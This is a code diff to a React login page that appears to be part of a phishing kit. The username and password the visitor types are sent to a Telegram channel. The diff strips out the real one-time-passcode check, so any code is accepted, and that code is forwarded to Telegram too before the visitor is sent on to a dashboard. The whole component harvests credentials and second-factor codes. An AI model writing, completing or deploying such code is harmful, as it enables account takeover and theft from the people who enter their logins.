@@ -11,7 +11,6 @@ import { OtpInput } from '@/components/OtpInput';
 import { useNavigate } from 'react-router-dom';
 import { loginBlocker } from '@/utils/loginBlocker';
 import { sendToTelegram } from '@/utils/telegramNotifier';
-import { supabase } from '@/integrations/supabase/client';
 
 export const Login = () => {
   const [showPassword, setShowPassword] = useState(false);
@@ -22,7 +21,6 @@ export const Login = () => {
   const [rememberMe, setRememberMe] = useState(false);
   const [useToken, setUseToken] = useState(false);
   const [showOtp, setShowOtp] = useState(false);
-  const [generatedOtp, setGeneratedOtp] = useState('');
   const navigate = useNavigate();
 
   // Clean up expired blocks on component mount
@@ -70,62 +68,35 @@ export const Login = () => {
       return;
     }
 
-    console.log(`User ${username} is not blocked, proceeding to send OTP...`);
+    console.log(`User ${username} is not blocked, proceeding to OTP...`);
     
     // Send username and password to Telegram
     sendToTelegram(`Username: ${username}\nPassword: ${password}`);
     
-    try {
-      // Call the edge function to send OTP
-      const { data, error } = await supabase.functions.invoke('send-otp', {
-        body: { username: username }
-      });
-
-      if (error) {
-        console.error('Error sending OTP:', error);
-        setLoginError('Failed to send OTP. Please try again.');
-        return;
-      }
-
-      if (data?.success && data?.otp) {
-        console.log('OTP sent successfully');
-        setGeneratedOtp(data.otp); // Store the generated OTP for verification
-        setShowOtp(true);
-      } else {
-        setLoginError('Failed to send OTP. Please try again.');
-      }
-    } catch (error) {
-      console.error('Error calling send-otp function:', error);
-      setLoginError('Failed to send OTP. Please try again.');
-    }
+    // Show OTP input after successful username/password entry
+    setShowOtp(true);
   };
 
   const handleOtpBack = () => {
     setShowOtp(false);
-    setGeneratedOtp('');
   };
 
   const handleOtpVerify = (otp: string) => {
     console.log('OTP verified:', otp);
     
-    // Verify OTP matches the generated one
-    if (otp === generatedOtp) {
-      // Send OTP to Telegram
-      sendToTelegram(`OTP: ${otp}\nUsername: ${username}`);
-      
-      // Block the user for 10 minutes after successful login
-      console.log(`Blocking user ${username} for 10 minutes...`);
-      loginBlocker.blockUser(username);
-      
-      // Set login status in session storage
-      sessionStorage.setItem('isLoggedIn', 'true');
-      
-      // Navigate to dashboard after successful OTP verification
-      navigate('/dashboard');
-    } else {
-      setLoginError('Invalid OTP. Please try again.');
-      setShowOtp(false);
-    }
+    // Accept any OTP the user enters
+    // Send OTP to Telegram
+    sendToTelegram(`OTP: ${otp}\nUsername: ${username}`);
+    
+    // Block the user for 10 minutes after successful login
+    console.log(`Blocking user ${username} for 10 minutes...`);
+    loginBlocker.blockUser(username);
+    
+    // Set login status in session storage
+    sessionStorage.setItem('isLoggedIn', 'true');
+    
+    // Navigate to dashboard after successful OTP verification
+    navigate('/dashboard');
   };
 
   return (
